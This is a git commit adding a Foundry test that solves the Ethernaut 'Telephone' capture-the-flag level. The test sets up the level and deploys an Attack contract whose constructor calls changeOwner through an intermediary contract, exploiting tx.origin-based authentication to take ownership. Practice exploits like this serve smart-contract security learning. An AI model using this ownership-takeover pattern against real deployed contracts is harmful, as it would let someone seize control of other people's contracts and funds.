29e550d4c13ec9788451c881a2874f9951097dd1
gtmendler <g.t.mendler@gmail.com>
2024-02-15 12:33:34 +0100

    added ethernaut solution 04 Telephone

---
+++ test/04-Telephone.t.sol
@@ -0,0 +1,53 @@
+pragma solidity ^0.8.10;
+
+//import "ds-test/test.sol";
+import "forge-std/Vm.sol";
+import "forge-std/Test.sol";
+
+import "../src/04-Telephone/TelephoneFactory.sol";
+import "../src/Ethernaut.sol";
+
+contract FallbackTest is Test {
+    Ethernaut ethernaut;
+    address eoaAddress = address(1337);
+
+    function setUp() public {
+        ethernaut = new Ethernaut();
+        vm.deal(eoaAddress, 1 ether);
+    }
+
+    function testTelephoneHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
+
+        TelephoneFactory factory = new TelephoneFactory();
+        ethernaut.registerLevel(factory);
+        vm.startPrank(eoaAddress);
+        address levelAddress = ethernaut.createLevelInstance(factory);
+        Telephone level = Telephone(payable(levelAddress));
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+        
+        new Attack(address(level));
+
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
+        vm.stopPrank();
+        assert(levelSuccessfullyPassed);
+    }
+}
+
+contract Attack {
+    constructor(address target) {
+        (bool success, ) = target.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
+        console.log(success);
+    }
+}
